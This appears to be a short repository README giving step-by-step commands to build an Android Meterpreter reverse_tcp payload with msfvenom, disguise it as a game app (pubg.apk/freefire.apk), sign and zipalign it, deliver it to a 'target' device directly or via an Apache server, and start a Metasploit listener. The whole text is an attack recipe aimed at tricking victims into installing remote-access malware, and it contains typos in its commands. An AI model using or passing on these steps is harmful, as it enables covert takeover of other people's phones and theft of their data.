# Metasploit-Android-Payload
All commands and Tools 
/**Create a payloads for android help to Metasploit Framework**/

For Linux ----------->>>>>>>>>>>>>>>>>>>>>>

sudo mafvenom -p android/meterpreter/reverse_tcp LHOST=your ip LPORT=4444 R> apk name(pubg.apk)


comment -->>//This is for only for local Area Network
 //lets us for make signed application for properly installed in android

sudo  keytool -genkey -v -keystore key.keystore -alias any name(professor) -keyalg RSA -keysize 2048 -calidity 10000
//then ask to you a password enter and some question you put the answer somthing you want

# sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore pubg.apk professor 


//then verify the application

 sudo jarsigner -verify -verbose -certs pubg.apk

//then optimize the apk with help zipalign

//enter command for zipalign tool
 sudo apt-get instal zipalign 

sudo zipalign -v 4 pubg.apk freefire.apk(//this is a new application name this applicatio you send your target) 

//you send and install this freefire apk on target android device

// you can also send the application from apache server

//copy this apk in /var/www/html/share/   and start apache server for start type the command : sudo service apache2 start

//lets start our meterpreter lisner before installng

msfconsole 
use exploit/multi/handler 
show options 

                                                                                                                                                       1,1           Top
